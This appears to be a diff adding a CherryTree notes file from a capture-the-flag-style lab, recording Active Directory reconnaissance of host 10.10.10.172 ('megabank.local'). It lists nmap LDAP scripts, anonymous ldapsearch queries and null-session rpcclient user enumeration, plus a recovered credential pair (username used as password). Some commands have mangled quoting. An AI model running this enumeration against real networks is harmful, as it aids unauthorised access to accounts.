@@ -1,0 +1,19 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="mont" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378694.32" ts_lastsave="1586387250.62" unique_id="1">
+		<rich_text>
+domain name= megabank.local
+DC=MEGABANK,DC=LOCAL
+
+nmap -p 389 --script ldap* 10.10.10.172
+
+ldapsearch -x -h 10.10.10.172 -b 'DC=MEGABANK,DC=LOCAL&quot;
+rpcclient -U “” -X -c querydispinfo 10.10.10.172
+
+ldapsearch -x -h 10.10.10.172 -b &quot;DC=MEGABANK,DC=LOCAL&quot; ’(ObjectClass=Person)' lastlogon
+rpcclient -U “” -X -h 10.10.10.172 -c enumdomusers
+
+1st user : SABatchJobs:SABatchJobs
+2nd user : mhope:</rich_text>
+	</node>
+</cherrytree>
